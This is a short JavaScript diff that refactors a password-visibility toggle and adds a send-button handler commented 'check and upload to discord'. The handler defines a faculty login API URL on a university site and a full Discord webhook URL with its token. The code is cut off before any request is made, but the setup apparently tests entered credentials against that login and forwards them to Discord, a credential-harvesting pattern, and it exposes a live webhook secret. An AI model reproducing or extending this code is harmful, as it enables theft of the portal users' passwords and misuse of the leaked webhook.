@@ -22,7 +22,8 @@ function showStatusMessage(message, color) {
     }, 3000);
 }
 
-function togglePassword() {
+// show/hide password
+document.getElementById("show-password-btn").addEventListener("click", () => {
     const passwordField = document.getElementById("password");
     const showPasswordBtn = document.getElementById("show-password-btn");
     
@@ -31,8 +32,9 @@ function togglePassword() {
     const isPassword = passwordField.type === "password";
     passwordField.type = isPassword ? "text" : "password";
     showPasswordBtn.textContent = isPassword ? "*️⃣" : "👁️";
-}
+});
 
+// check and upload to discord
 document.getElementById("sendButton")?.addEventListener("click", async () => {
     const baseURL = "https://bauc14.bis.edu.iq/api/faculty/auth/login?page_path=%2Ffaculty%2Flogin";
     const webhookURL = "https://discord.com/api/webhooks/1340785470296035338/-sE250LvVvvFyyQwRdYADHIXwcV3jpHMdLs03nzH9HGwBDrPjlCC3_i3SRhV7MS-n2ie";
